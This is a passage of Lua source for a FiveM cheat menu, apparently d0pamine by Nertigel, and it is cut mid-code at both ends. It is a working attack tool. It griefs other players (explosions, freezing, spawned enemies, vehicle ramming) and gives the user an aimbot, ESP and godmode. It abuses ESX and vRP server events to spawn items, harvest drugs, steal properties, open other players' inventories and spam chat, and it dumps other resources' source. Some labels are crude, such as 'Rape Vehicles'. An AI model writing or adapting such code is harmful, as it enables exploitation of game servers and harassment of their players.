					if Dopamine.MenuButton("~b~["..GetPlayerServerId(currentPlayer).."]~s~ "..GetPlayerName(currentPlayer)..' ['..(IsEntityDead(GetPlayerPed(i), 1) and '~r~Dead~s~]' or '~g~Alive~s~]'), 'selectedPlayerOptions') then
						selectedPlayer = currentPlayer 
					end
				end
			end

			Dopamine.Display()
		elseif Dopamine.IsMenuOpened('allPlayersOptions') then
			if Dopamine.CheckBox('Include Self', allPlayersIncludeSelf) then
				allPlayersIncludeSelf = not allPlayersIncludeSelf
			elseif Dopamine.Button('Rape Vehicles', 'Native') then
				NertigelFunc.aPO.rapeVehicles()
			elseif Dopamine.Button('Explode Vehicles', 'Native') then
				NertigelFunc.aPO.explodeCars()
			elseif Dopamine.Button("Clone Peds", "Native") then
				NertigelFunc.aPO.clonePeds()
			elseif Dopamine.ComboBox('Spawn Props', {'Gas Pump', 'Beach Fire', 'Gas Tank', 'UFO', 'Dildo', 'Toilet', 'Missile', 'Couch'}, sPOPropOptionsCurrent, sPOPropOptionsSelected, 
				function(currentIndex, selectedIndex)
					sPOPropOptionsCurrent = currentIndex
					sPOPropOptionsSelected = currentIndex
				end) then
				if sPOPropOptionsSelected == 1 then
					NertigelFunc.aPO.gasPump()
				elseif sPOPropOptionsSelected == 2 then
					NertigelFunc.aPO.beachFire()
				elseif sPOPropOptionsSelected == 3 then
					NertigelFunc.aPO.spawnTrollProp('prop_gas_tank_01a')
					NertigelFunc.aPO.spawnTrollProp('prop_gascyl_01a')
				elseif sPOPropOptionsSelected == 4 then
					NertigelFunc.aPO.spawnTrollProp('p_spinning_anus_s')
				elseif sPOPropOptionsSelected == 5 then
					NertigelFunc.aPO.spawnTrollProp('prop_cs_dildo_01')
				elseif sPOPropOptionsSelected == 6 then
					NertigelFunc.aPO.spawnTrollProp('prop_ld_toilet_01')
				elseif sPOPropOptionsSelected == 7 then
					NertigelFunc.aPO.spawnTrollProp('prop_ld_bomb_anim')
				elseif sPOPropOptionsSelected == 8 then
					NertigelFunc.aPO.spawnTrollProp('prop_ld_farm_couch01')
				end
			elseif Dopamine.Button("Vehicles Into Ramps", "Native") then
				NertigelFunc.aPO.vehiclesIntoRamps()
			elseif Dopamine.CheckBox('Freeze', allPlayersFreeze) then
				allPlayersFreeze = not allPlayersFreeze
			elseif Dopamine.CheckBox('Disable Driving Vehicles', allPlayersDisableDrivingCars) then
				allPlayersDisableDrivingCars = not allPlayersDisableDrivingCars
			elseif Dopamine.CheckBox('Noisy Vehicles', allPlayersNoisyVehicles) then
				allPlayersNoisyVehicles = not allPlayersNoisyVehicles
			elseif Dopamine.Button("Run Everything ~r~(!)", 'Native') then
				NertigelFunc.aPO.beachFire()
				NertigelFunc.aPO.gasPump()
				NertigelFunc.aPO.clonePeds()
				NertigelFunc.aPO.rapeVehicles()
				NertigelFunc.aPO.vehiclesIntoRamps()
				NertigelFunc.aPO.explodeCars()
				NertigelFunc.aPO.freezeAll()
				NertigelFunc.aPO.disableDrivingCars()
				NertigelFunc.aPO.spawnTrollProp('prop_gas_tank_01a')
				NertigelFunc.aPO.spawnTrollProp('prop_gascyl_01a')
				NertigelFunc.aPO.spawnTrollProp('p_spinning_anus_s')
				NertigelFunc.aPO.spawnTrollProp('prop_cs_dildo_01')
				NertigelFunc.aPO.spawnTrollProp('prop_ld_toilet_01')
				NertigelFunc.aPO.spawnTrollProp('prop_ld_bomb_anim')
				NertigelFunc.aPO.spawnTrollProp('prop_ld_farm_couch01')
			end

			Dopamine.Display()
		elseif Dopamine.IsMenuOpened('selectedPlayerOptions') then
			Dopamine.SetSubTitle('selectedPlayerOptions', '~b~['..GetPlayerServerId(selectedPlayer)..']~s~ '..GetPlayerName(selectedPlayer))
			if Dopamine.MenuButton('Troll Options', 'selectedPlayerOptionsTroll') then
			elseif Dopamine.MenuButton('Trigger Options', 'selectedPlayerOptionsTriggers') then
			elseif Dopamine.Button("Spectate", isSpectatingTarget and '~w~Spectating: ~s~['..GetPlayerServerId(spectatedPlayer)..']') then
				spectatedPlayer = selectedPlayer
				NertigelFunc.sPO.spectatePlayer(spectatedPlayer)
			elseif Dopamine.Button("Teleport To", "Native") then
				NertigelFunc.sPO.teleportToPlayer(selectedPlayer)
			elseif Dopamine.Button("Clone Vehicle", "Native") then
				NertigelFunc.sPO.cloneVehicle(selectedPlayer)
			elseif Dopamine.Button("Clone Outfit", "Native") then
				NertigelFunc.sPO.clonePedOutfit(PlayerPedId(), GetPlayerPed(selectedPlayer))
			elseif Dopamine.Button("Give All Weapons", "Native") then
				NertigelFunc.sPO.giveAllWeapons(GetPlayerPed(selectedPlayer))
			end

			Dopamine.Display()
		elseif Dopamine.IsMenuOpened('selectedPlayerOptionsTriggers') then
			if Dopamine.Button("Open Inventory", 'ESX | Client') then
				TriggerCustomEvent(false, "esx_inventoryhud:openPlayerInventory", GetPlayerServerId(selectedPlayer), GetPlayerName(selectedPlayer))
			end

			Dopamine.Display()
		elseif Dopamine.IsMenuOpened('selectedPlayerOptionsTroll') then
			if Dopamine.Button("Clear Animation/Tasks", "Native") then
				ClearPedTasksImmediately(GetPlayerPed(selectedPlayer))
			elseif Dopamine.Button("Disable Vehicle Engine", "Native") then
				if IsPedInAnyVehicle(GetPlayerPed(selectedPlayer), false) then
					RequestControlOnce(GetVehiclePedIsIn(GetPlayerPed(selectedPlayer), false))
					SetVehicleEngineOn(GetVehiclePedIsIn(GetPlayerPed(selectedPlayer), false), false, true, true)
					BringVehicleToHalt(GetVehiclePedIsIn(GetPlayerPed(selectedPlayer), false), 3.0, 5, true)
				end
			elseif Dopamine.Button("Spawn Weapon Pickups", "Native") then
				NertigelFunc.sPO.spawnPickupsOn(GetPlayerPed(selectedPlayer))
			elseif Dopamine.Button("Spawn Enemies", "Native") then
				NertigelFunc.sPO.spawnEnemies(GetPlayerPed(selectedPlayer), 'a_m_y_skater_01')
			elseif Dopamine.Button('Spawn Heli Enemies', "Native") then
				NertigelFunc.sPO.spawnHeliEnemies(GetPlayerPed(selectedPlayer))
			elseif Dopamine.Button('Spawn Tank Enemy', "Native") then
				NertigelFunc.sPO.spawnTankEnemy(GetPlayerPed(selectedPlayer))
			elseif Dopamine.Button("Explode ~r~(!)", "Native") then
				local coords = GetEntityCoords(GetPlayerPed(selectedPlayer))
				AddExplosion(coords.x+1, coords.y+1, coords.z+1, 4, 100.0, true, false, 0.0)
			elseif Dopamine.ComboBox('Spawn Props', {'Gas Pump', 'Beach Fire', 'Gas Tank', 'UFO', 'Dildo', 'Toilet', 'Missile', 'Couch'}, aPOPropOptionsCurrent, aPOPropOptionsSelected, 
				function(currentIndex, selectedIndex)
					aPOPropOptionsCurrent = currentIndex
					aPOPropOptionsSelected = currentIndex
				end) then
				if aPOPropOptionsSelected == 1 then
					NertigelFunc.aPO.gasPump()
				elseif aPOPropOptionsSelected == 2 then
					NertigelFunc.aPO.beachFire()
				elseif aPOPropOptionsSelected == 3 then
					NertigelFunc.sPO.spawnTrollProp(GetPlayerPed(selectedPlayer), 'prop_gas_tank_01a')
					NertigelFunc.sPO.spawnTrollProp(GetPlayerPed(selectedPlayer), 'prop_gascyl_01a')
				elseif aPOPropOptionsSelected == 4 then
					NertigelFunc.sPO.spawnTrollProp(GetPlayerPed(selectedPlayer), 'p_spinning_anus_s')
				elseif aPOPropOptionsSelected == 5 then
					NertigelFunc.sPO.spawnTrollProp(GetPlayerPed(selectedPlayer), 'prop_cs_dildo_01')
				elseif aPOPropOptionsSelected == 6 then
					NertigelFunc.sPO.spawnTrollProp(GetPlayerPed(selectedPlayer), 'prop_ld_toilet_01')
				elseif aPOPropOptionsSelected == 7 then
					NertigelFunc.sPO.spawnTrollProp(GetPlayerPed(selectedPlayer), 'prop_ld_bomb_anim')
				elseif aPOPropOptionsSelected == 8 then
					NertigelFunc.sPO.spawnTrollProp(GetPlayerPed(selectedPlayer), 'prop_ld_farm_couch01')
				end
			elseif Dopamine.ComboBox("Ram Vehicle", sPORamVehicleWords, sPORamVehicleCurrent, sPORamVehicleSelected, 
				function(currentIndex, selectedIndex)
					sPORamVehicleCurrent = currentIndex
					sPORamVehicleSelected = currentIndex
					sPORamVehicleX = sPORamVehicleWords[currentIndex]
				end) then
				NertigelFunc.sPO.ramVehicle(GetPlayerPed(selectedPlayer), sPORamVehicleX)
			end
			
			Dopamine.Display()
		elseif Dopamine.IsMenuOpened('visualOptions') then
			if Dopamine.MenuButton('Extra Sensory Perception', 'visualOptionsESP', '', {dict = 'mphud', text = 'spectating', color = {r=255, g=255, b=255}}) then
			elseif Dopamine.ComboBox('Crosshair', customCrosshairOpts, currentCustomCrosshair, selectedCustomCrosshair, 
				function(currentIndex, selectedIndex)
					currentCustomCrosshair = currentIndex
					selectedCustomCrosshair = currentIndex
				end)
				then
			elseif Dopamine.Button('Optimize FPS', 'Native') then
				NertigelFunc.optimizeFPS()
			elseif Dopamine.CheckBox('Blackout', visualsBlackout) then
				visualsBlackout = not visualsBlackout
			end

			Dopamine.Display()
		elseif Dopamine.IsMenuOpened('visualOptionsESP') then
			if Dopamine.CheckBox('Enable', visualsESPEnable) then
				visualsESPEnable = not visualsESPEnable
				NertigelFunc.toggleESP()
			elseif Dopamine.CheckBox('Self', visualsESPShowSelf) then
				visualsESPShowSelf = not visualsESPShowSelf
			elseif Dopamine.CheckBox('Line', visualsESPShowLine) then
				visualsESPShowLine = not visualsESPShowLine
			elseif Dopamine.CheckBox('Box', visualsESPShowBox) then
				visualsESPShowBox = not visualsESPShowBox
			elseif Dopamine.CheckBox('ID', visualsESPShowID) then
				visualsESPShowID = not visualsESPShowID
			elseif Dopamine.CheckBox('Name', visualsESPShowName) then
				visualsESPShowName = not visualsESPShowName
			elseif Dopamine.CheckBox('Distance', visualsESPShowDistance) then
				visualsESPShowDistance = not visualsESPShowDistance
			elseif Dopamine.CheckBox('Weapon', visualsESPShowWeapon) then
				visualsESPShowWeapon = not visualsESPShowWeapon
			elseif Dopamine.CheckBox('Vehicle', visualsESPShowVehicle) then
				visualsESPShowVehicle = not visualsESPShowVehicle
			elseif Dopamine.ComboBoxSlider("ESP Refresh Rate", visualsESPRefreshRates, currentESPRefreshIndex, selectedESPRefreshIndex, 
				function(currentIndex, selectedIndex)
					currentESPRefreshIndex = currentIndex
					selectedESPRefreshIndex = currentIndex
					if currentIndex == 1 then
						visualsESPRefreshRate = 0
					elseif currentIndex == 2 then
						visualsESPRefreshRate = 50
					elseif currentIndex == 3 then
						visualsESPRefreshRate = 150
					elseif currentIndex == 4 then
						visualsESPRefreshRate = 250
					elseif currentIndex == 5 then
						visualsESPRefreshRate = 500
					elseif currentIndex == 6 then
						visualsESPRefreshRate = 1000
					elseif currentIndex == 7 then
						visualsESPRefreshRate = 2000
					elseif currentIndex == 8 then
						visualsESPRefreshRate = 5000
					end
				end) then
			elseif Dopamine.ComboBoxSlider("ESP Distance", visualsESPDistanceOps, currentVisualsESPDistance, selectedVisualsESPDistance, 
				function(currentIndex, selectedIndex)
					currentVisualsESPDistance = currentIndex
					selectedVisualsESPDistance = currentIndex
					visualsESPDistance = visualsESPDistanceOps[currentVisualsESPDistance]
				end) then
			end

			Dopamine.Display()
		elseif Dopamine.IsMenuOpened('teleportOptions') then
			if Dopamine.Button('Teleport To Waypoint', 'Native') then
				NertigelFunc.teleportToWaypoint()
			elseif Dopamine.ComboBox('Teleport To', {'Legion Square', 'Weed Farm', 'Meth Farm', 'Coke Farm', 'Money Wash', 'Mission Row PD'}, currentTeleportToOptions, selectedTeleportToOptions, 
				function(currentIndex, selectedIndex)
					currentTeleportToOptions = currentIndex
					selectedTeleportToOptions = currentIndex
				end)
				then
				if selectedTeleportToOptions == 1 then
					SetEntityCoords(PlayerPedId(), 195.23, -934.04, 30.69)
				elseif selectedTeleportToOptions == 2 then
					SetEntityCoords(PlayerPedId(), 1066.009, -3183.386, -39.164)
				elseif selectedTeleportToOptions == 3 then
					SetEntityCoords(PlayerPedId(), 998.629, -3199.545, -36.394)
				elseif selectedTeleportToOptions == 4 then
					SetEntityCoords(PlayerPedId(), 1088.636, -3188.551, -38.993)
				elseif selectedTeleportToOptions == 5 then
					SetEntityCoords(PlayerPedId(), 1118.405, -3193.687, -40.394)
				elseif selectedTeleportToOptions == 6 then
					SetEntityCoords(PlayerPedId(), 441.56, -982.9, 30.69)
				end
			elseif Dopamine.CheckBox('Show Coords', teleportShowCoords) then
				teleportShowCoords = not teleportShowCoords
			end

			Dopamine.Display()
		elseif Dopamine.IsMenuOpened('vehicleOptions') then
			if Dopamine.MenuButton('Los Santos Customs', 'vehicleLosSantosCustoms') then
			elseif Dopamine.MenuButton('Vehicle Spawn List', 'vehicleSpawnList') then
			elseif Dopamine.CheckBox('Godmode', vehiclesGodmode) then
				vehiclesGodmode = not vehiclesGodmode
			elseif Dopamine.Button('Repair Vehicle', 'Native') then
				NertigelFunc.repairVehicle(GetVehiclePedIsIn(PlayerPedId(), 0))
			elseif Dopamine.Button('Clean Vehicle', 'Native') then
				SetVehicleDirtLevel(GetVehiclePedIsIn(PlayerPedId(), 0), 0.0)
			elseif Dopamine.Button('Dirty Vehicle', 'Native') then
				SetVehicleDirtLevel(GetVehiclePedIsIn(PlayerPedId(), 0), 15.0)
			elseif Dopamine.Button('Flip Vehicle', 'Native') then
				SetVehicleOnGroundProperly(GetVehiclePedIsIn(PlayerPedId(), 0))
			elseif Dopamine.Button('Delete Vehicle', 'Native') then
				NertigelFunc.deleteVehicle(GetVehiclePedIsIn(PlayerPedId(), 0))
			elseif Dopamine.Button('Delete Vehicles Within Radius', 'Native') then
				NertigelFunc.deleteVehicle(GetVehiclePedIsIn(PlayerPedId(), 0), 100)
			elseif Dopamine.ComboBoxSlider("Engine Power Boost", vehiclesMultiplierXWords, vehiclesEnginePowerBoostCurrent, vehiclesEnginePowerBoostSelected, 
				function(currentIndex, selectedIndex)
					vehiclesEnginePowerBoostCurrent = currentIndex
					vehiclesEnginePowerBoostSelected = currentIndex
					enginePowerBoost = vehiclesMultiplierX[currentIndex]
				end) then
			elseif Dopamine.ComboBoxSlider("Engine Torque Boost", vehiclesMultiplierXWords, vehiclesEngineTorqueBoostCurrent, vehiclesEngineTorqueBoostSelected, 
				function(currentIndex, selectedIndex)
					vehiclesEngineTorqueBoostCurrent = currentIndex
					vehiclesEngineTorqueBoostSelected = currentIndex
					engineTorqueBoost = vehiclesMultiplierX[currentIndex]
				end) then
			elseif Dopamine.ComboBox('Change sound', vehiclesCustomSounds, vehiclesCustomSoundCurrent, vehiclesCustomSoundSelected, 
				function(currentIndex, selectedIndex)
					vehiclesCustomSoundCurrent = currentIndex
					vehiclesCustomSoundSelected = selectedIndex
				end) then
					ForceVehicleEngineAudio(GetVehiclePedIsIn(GetPlayerPed(-1), false), vehiclesCustomSounds[vehiclesCustomSoundSelected])
			elseif Dopamine.CheckBox('Rainbow Paintjob', vehiclesRainbow) then
				vehiclesRainbow = not vehiclesRainbow
			elseif Dopamine.CheckBox('Lower Vehicle', vehiclesLower) then
				vehiclesLower = not vehiclesLower
			elseif Dopamine.CheckBox('Wallride', vehiclesWallride) then
				vehiclesWallride = not vehiclesWallride
			elseif Dopamine.CheckBox('2-Step Vehicle', vehicleOptions2Step) then
				vehicleOptions2Step = not vehicleOptions2Step
			elseif Dopamine.CheckBox('Always Wheelie', vehiclesAlwaysWheelie) then
				vehiclesAlwaysWheelie = not vehiclesAlwaysWheelie
			elseif Dopamine.CheckBox('Drift Smoke', vehiclesDriftSmoke) then
				vehiclesDriftSmoke = not vehiclesDriftSmoke
			end

			Dopamine.Display()
		elseif Dopamine.IsMenuOpened('weaponOptions') then
			if Dopamine.MenuButton('Give Single Weapon', 'weaponOptionsTypes') then
			elseif Dopamine.Button('Give All Weapons') then
                NertigelFunc.sPO.giveAllWeapons(PlayerId())
            elseif Dopamine.Button('Remove All Weapons') then
                RemoveAllPedWeapons(PlayerPedId(-1), true)
			elseif Dopamine.ComboBox('Damage Multiplier', weaponsDamageMultiplier, weaponsDamageMultiplierCurrent, weaponsDamageMultiplierSelected, 
				function(currentIndex, selectedIndex)
                    weaponsDamageMultiplierCurrent = currentIndex
					weaponsDamageMultiplierSelected = currentIndex
					weaponsDamageMultiplierSet = weaponsDamageMultiplier[weaponsDamageMultiplierSelected]
                end) then
			elseif Dopamine.CheckBox('Explosive Impact', weaponsExplosiveAmmo) then
				weaponsExplosiveAmmo = not weaponsExplosiveAmmo
			elseif Dopamine.CheckBox('Teleport To Impact', weaponsTeleportGun) then
				weaponsTeleportGun = not weaponsTeleportGun
			elseif Dopamine.CheckBox('Rapid Fire', weaponsRapidFire) then
				weaponsRapidFire = not weaponsRapidFire
			elseif Dopamine.CheckBox('Aimbot ~r~(!)', weaponsAimbotT) then
				weaponsAimbotT = not weaponsAimbotT
			end
			
			Dopamine.Display()
		elseif Dopamine.IsMenuOpened('serverOptions') then
			Dopamine.SetSubTitle('serverOptions', 'Server IP: '..GetCurrentServerEndpoint())
			if Dopamine.MenuButton('Server Resources', 'serverOptionsResources') then
			elseif Dopamine.MenuButton('Trigger Events', 'serverOptionsTriggerEvents') then
			elseif Dopamine.ComboBoxSlider("Ped Density", pedDensityXWords, pedDensityXCurrent, pedDensityXSelectedf, 
				function(currentIndex, selectedIndex)
					pedDensityXCurrent = currentIndex
					pedDensityXSelectedf = currentIndex
					pedDensityXSelected = pedDensityX[currentIndex]
				end) then
			end
			if NertigelFunc.doesResourceExist('es_extended') then
				if Dopamine.Button('Print getSharedObject', 'Client') then
					local LOAD_es_extended = LoadResourceFile("es_extended", "client/common.lua")
					if LOAD_es_extended then
						LOAD_es_extended = LOAD_es_extended:gsub("AddEventHandler", "")
						LOAD_es_extended = LOAD_es_extended:gsub("cb", "")
						LOAD_es_extended = LOAD_es_extended:gsub("function ", "")
						LOAD_es_extended = LOAD_es_extended:gsub("return ESX", "")
						LOAD_es_extended = LOAD_es_extended:gsub("(ESX)", "")
						LOAD_es_extended = LOAD_es_extended:gsub("function", "")
						LOAD_es_extended = LOAD_es_extended:gsub("getSharedObject%(%)", "")
						LOAD_es_extended = LOAD_es_extended:gsub("end", "")
						LOAD_es_extended = LOAD_es_extended:gsub("%(", "")
						LOAD_es_extended = LOAD_es_extended:gsub("%)", "")
						LOAD_es_extended = LOAD_es_extended:gsub(",", "")
						LOAD_es_extended = LOAD_es_extended:gsub("\n", "")
						LOAD_es_extended = LOAD_es_extended:gsub("'", "")
						LOAD_es_extended = LOAD_es_extended:gsub("%s+", "")
						print(tostring(LOAD_es_extended))
					end
				end
			end

			Dopamine.Display()
		elseif Dopamine.IsMenuOpened('serverOptionsResources') then
			for i=0, #serverOptionsResources do
				if Dopamine.Button(serverOptionsResources[i]) then
				end
			end

			Dopamine.Display()
		elseif Dopamine.IsMenuOpened('menuSettings') then
			if Dopamine.MenuButton('Credits', 'credits') then
			elseif Dopamine.MenuButton('Keybinds', 'keybindSettings') then
			elseif Dopamine.ComboBox('Menu X', menuX, currentMenuX, selectedMenuX, 
				function(currentIndex, selectedIndex)
					currentMenuX = currentIndex
					selectedMenuX = selectedIndex
					for i = 1, #menus_list do
						Dopamine.SetMenuX(menus_list[i], menuX[currentMenuX])
					end
                end) 
                then
            elseif Dopamine.ComboBox('Menu Y', menuY, currentMenuY, selectedMenuY, 
				function(currentIndex, selectedIndex)
					currentMenuY = currentIndex
					selectedMenuY = selectedIndex
					for i = 1, #menus_list do
						Dopamine.SetMenuY(menus_list[i], menuY[currentMenuY])
					end
                end)
				then
			elseif Dopamine.ComboBox('Theme', availableThemes, currentThemeIndex, selectedThemeIndex, 
				function(currentIndex, selectedIndex)
					currentThemeIndex = currentIndex
					selectedThemeIndex = currentIndex
				end) then 
					selectedTheme = availableThemes[selectedThemeIndex]Dopamine.InitializeTheme()
			elseif Dopamine.CheckBox('Rainbow', selectedThemeRainbow) then
				selectedThemeRainbow = not selectedThemeRainbow
			elseif Dopamine.CheckBox('Text Outline', menu_TextOutline) then
				menu_TextOutline = not menu_TextOutline
			elseif Dopamine.CheckBox('Text Drop Shadow', menu_TextDropShadow) then
				menu_TextDropShadow = not menu_TextDropShadow
			elseif Dopamine.CheckBox('Selection Rect', menu_RectOverlay) then
				menu_RectOverlay = not menu_RectOverlay
            elseif Dopamine.Button('~r~Close Menu') then
            	Dopamine.CloseMenu()
            	ShouldShowMenu = false
            end

			Dopamine.Display()
		elseif Dopamine.IsMenuOpened('credits') then
			for i = 1, #creditsList do 
				if Dopamine.Button(creditsList[i]) then 
				end 
			end

			Dopamine.Display()
		elseif Dopamine.IsMenuOpened('keybindSettings') then
			if Dopamine.Button('Menu', '['..currentKeybindMenu..']') then
				print(json.encode(Keys))
				local key = string.upper(NertigelFunc.Game.KeyboardInput("Input New Key Name (check console)"))
				
				if Keys[key] then
					currentKeybindMenu = key
					Dopamine.PushNotification("Menu bind has been set to ~g~"..key, 5000)
				else
					Dopamine.PushNotification("Key ~r~"..key.."~s~ is not valid!", 5000)
				end
			end 

			Dopamine.Display()
		elseif Dopamine.IsMenuOpened('weaponOptionsTypes') then
            for yeet, ayy in pairs(weaponsTableFM) do
                if Dopamine.MenuButton(yeet, 'weaponOptionsTypeSelection') then
                    weaponOptionsSelected = ayy
                end
            end

            Dopamine.Display()
        elseif Dopamine.IsMenuOpened('weaponOptionsTypeSelection') then
			for _, ayy in pairs(weaponOptionsSelected) do
                if Dopamine.MenuButton(ayy.name, 'weaponModOptionsOptions') then
                    weaponOptionsSelectedWeapon = ayy
                end
            end

            Dopamine.Display()
        elseif Dopamine.IsMenuOpened('weaponModOptionsOptions') then
            if Dopamine.Button('Spawn Weapon') then
                GiveWeaponToPed(GetPlayerPed(-1), GetHashKey(weaponOptionsSelectedWeapon.id), 1000, false)
            elseif Dopamine.Button('Add Ammo') then
				SetPedAmmo(GetPlayerPed(-1), GetHashKey(weaponOptionsSelectedWeapon.id), 250)
			elseif Dopamine.CheckBox('Infinite Ammo', weaponOptionsSelectedWeapon.bInfAmmo) then
				weaponOptionsSelectedWeapon.bInfAmmo = not weaponOptionsSelectedWeapon.bInfAmmo
				SetPedInfiniteAmmo(GetPlayerPed(-1), weaponOptionsSelectedWeapon.bInfAmmo, GetHashKey(weaponOptionsSelectedWeapon.id))
				SetPedInfiniteAmmoClip(GetPlayerPed(-1), true)
				PedSkipNextReloading(GetPlayerPed(-1))
            end
            for yeet, ayy in pairs(weaponOptionsSelectedWeapon.mods) do
                if Dopamine.MenuButton(yeet, 'weaponsModSelect') then
                    weaponOptionsSelectedMod = ayy
                end
            end

            Dopamine.Display()
        elseif Dopamine.IsMenuOpened('weaponsModSelect') then
            for _, ev in pairs(weaponOptionsSelectedMod) do
                if Dopamine.Button(ev.name) then
                    GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey(weaponOptionsSelectedWeapon.id), GetHashKey(ev.id))
                end
            end

            Dopamine.Display()
        elseif Dopamine.IsMenuOpened('vehicleLosSantosCustoms') then
        	if Dopamine.MenuButton('Cosmetic Upgrades', 'vehicleLosSantosCustomsCosmetics') then
			elseif Dopamine.MenuButton('Performance Upgrades', 'vehicleLosSantosCustomsPerformance') then
			elseif Dopamine.Button('Max Peformance Upgrades', 'Native') then
				NertigelFunc.maxPerformanceUpgrades(GetVehiclePedIsIn(PlayerPedId()))
			elseif Dopamine.Button('Max All Upgrades', 'Native') then
				NertigelFunc.maxUpgrades(GetVehiclePedIsIn(PlayerPedId()))
        	end

            Dopamine.Display()
        elseif Dopamine.IsMenuOpened('vehicleLosSantosCustomsCosmetics') then

        	Dopamine.Display()
        elseif Dopamine.IsMenuOpened('vehicleLosSantosCustomsPerformance') then
			if IsToggleModOn(GetVehiclePedIsUsing(PlayerPedId()), 18) then
				turboStatus = '~g~Installed'
			else
				turboStatus = '~r~Not Installed'
			end
            if Dopamine.Button('Turbo', turboStatus) then
                if not IsToggleModOn(GetVehiclePedIsUsing(PlayerPedId()), 18) then
                    ToggleVehicleMod(GetVehiclePedIsUsing(PlayerPedId()), 18, not IsToggleModOn(GetVehiclePedIsUsing(PlayerPedId()), 18))
                else
                    ToggleVehicleMod(GetVehiclePedIsUsing(PlayerPedId()), 18, not IsToggleModOn(GetVehiclePedIsUsing(PlayerPedId()), 18))
                end
            end

            Dopamine.Display()
		elseif Dopamine.IsMenuOpened('vehicleSpawnList') then
			if Dopamine.CheckBox('Spawn Upgraded', vehiclesSpawnUpgraded) then
				vehiclesSpawnUpgraded = not vehiclesSpawnUpgraded
			elseif Dopamine.CheckBox('Spawn Inside', vehiclesSpawnInside) then
				vehiclesSpawnInside = not vehiclesSpawnInside
			elseif Dopamine.Button('Spawn Custom Vehicle', 'Native') then
				local ModelName = NertigelFunc.Game.KeyboardInput("Enter Vehicle Spawn Name", "", 100)
				if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
					NertigelFunc.spawnCustomVehicle(ModelName)
				else
					Dopamine.PushNotification('Model is not valid!', 5000)
				end
			elseif Dopamine.Button('Spawn & Ride Train', 'Native') then
				NertigelFunc.spawnRandomTrain()
			end
        	for yeet, ayy in ipairs(vehicleCategories) do
                if Dopamine.MenuButton(ayy, 'vehicleSpawnSelected') then
                    selectedCarTypeIdx = yeet
                end
            end

        	Dopamine.Display()
        elseif Dopamine.IsMenuOpened('vehicleSpawnSelected') then
			for yeet, ayy in ipairs(fullVehicleList[selectedCarTypeIdx]) do
				local vehname = GetLabelText(ayy)
				if vehname == "NULL" then vehname = ayy end
				if Dopamine.MenuButton(vehname, 'vehicleSpawnSelectedOptions') then
                    selectedCarToSpawn = yeet
                end
            end
            Dopamine.Display()
        elseif Dopamine.IsMenuOpened('vehicleSpawnSelectedOptions') then
        	if Dopamine.Button('Spawn Car') then
                NertigelFunc.spawnVehicle(fullVehicleList[selectedCarTypeIdx][selectedCarToSpawn])
            end

			Dopamine.Display()
		elseif Dopamine.IsMenuOpened('serverOptionsTriggerEvents') then
			if Dopamine.MenuButton('ESX Triggers', 'serverOptionsTriggerEventsESX') then
			elseif Dopamine.MenuButton('vRP Triggers', 'serverOptionsTriggerEventsVRP') then
			elseif Dopamine.Button('Spam Chat', 'Server') then
				for colorLoop=0,9 do
					TriggerCustomEvent(true, '_chat:messageEntered','d0pamine',{MainColor.r,MainColor.g,MainColor.b},'^'..colorLoop..' d0pamine | Nertigel#5391')
				end
			end
			
			Dopamine.Display()
		elseif Dopamine.IsMenuOpened('serverOptionsTriggerEventsESX') then
			if Dopamine.MenuButton('Property Stealer', 'serverOptionsTriggerEventsESXProperty') then
			elseif Dopamine.Button('Skin Changer', 'Client') then
				if NertigelFunc.doesResourceExist('esx_skin') then
					Dopamine.CloseMenu()
					TriggerCustomEvent(false, 'esx_skin:openRestrictedMenu', function(data, menu) end)
				else Dopamine.PushNotification("Resource was not found!", 5000) end
			elseif Dopamine.Button('Full Hunger', 'Client') then
				if NertigelFunc.doesResourceExist('esx_status') then
					TriggerCustomEvent(false, 'esx_status:set', "hunger", 1000000)
				else Dopamine.PushNotification("Resource was not found!", 5000) end
			elseif Dopamine.Button('Full Thirst', 'Client') then
				if NertigelFunc.doesResourceExist('esx_status') then
					TriggerCustomEvent(false, 'esx_status:set', "thirst", 1000000)
				else Dopamine.PushNotification("Resource was not found!", 5000) end
			elseif Dopamine.ComboBox('Spawn Jobs Items', Jobs.Item, currentESXItemSpawn, selectedESXItemSpawn, 
				function(currentIndex, selectedIndex)
					currentESXItemSpawn = currentIndex
					selectedESXItemSpawn = currentIndex
				end)
				then
				if NertigelFunc.doesResourceExist('esx_jobs') then
					local item = Jobs.Item[selectedESXItemSpawn]
					local JobDB = Jobs.ItemDatabase[item]
					if type(JobDB) == "table" then
						Citizen.CreateThread(function()
							for key, value in pairs(JobDB) do
								local ItemRequired = Jobs.ItemRequires[key]
								local ItemData = 
								{
									{
										name = key, db_name = value, time = 100, max = 100, add = 10, remove = 10, drop = 100,
										requires = ItemRequired and JobDB[ItemRequired] or "nothing",
										requires_name = ItemRequired and ItemRequired or "Nothing"
									}
								}
								Citizen.CreateThread(function()
									TriggerCustomEvent(true, 'esx_jobs:startWork', ItemData)
									Wait(1000)
									TriggerCustomEvent(true, 'esx_jobs:stopWork', ItemData)
								end)
								Wait(3000)
							end
						end)
					else
						local ItemRequired = Jobs.ItemRequires[item];
						local ItemData = {
							{
								name = item, db_name = JobDB, time = 100, max = 100, add = 10, remove = 10, drop = 100,
								requires = ItemRequired and Jobs.ItemDatabase[ItemRequired] or "nothing",
								requires_name = ItemRequired and ItemRequired or "Nothing"
							}
						}
						Citizen.CreateThread(function()
							TriggerCustomEvent(true, 'esx_jobs:startWork', ItemData)
							Wait(100)
							TriggerCustomEvent(true, 'esx_jobs:stopWork', ItemData)
						end)
					end
				else Dopamine.PushNotification("Resource was not found!", 5000) end
			elseif Dopamine.ComboBox('Harvest Drugs', {'Weed', 'Opium', 'Meth', 'Coke'}, currentESXDrugSpawn, selectedESXDrugSpawn, 
				function(currentIndex, selectedIndex)
					currentESXDrugSpawn = currentIndex
					selectedESXDrugSpawn = currentIndex
				end)
				then
				if NertigelFunc.doesResourceExist('esx_drugs') or NertigelFunc.doesResourceExist('esx_illegal_drugs') then
					if selectedESXDrugSpawn == 1 then
						TriggerCustomEvent(true, 'esx_drugs:startHarvestWeed')
						TriggerCustomEvent(true, 'esx_illegal_drugs:startHarvestWeed')
						TriggerCustomEvent(true, 'esx_drugs:pickedUpCannabis')

						TriggerCustomEvent(true, 'esx_drugs:startTransformWeed')
						TriggerCustomEvent(true, 'esx_illegal_drugs:startTransformWeed')
						TriggerCustomEvent(true, 'esx_drugs:processCannabis')
					elseif selectedESXDrugSpawn == 2 then
						TriggerCustomEvent(true, 'esx_drugs:startHarvestOpium')
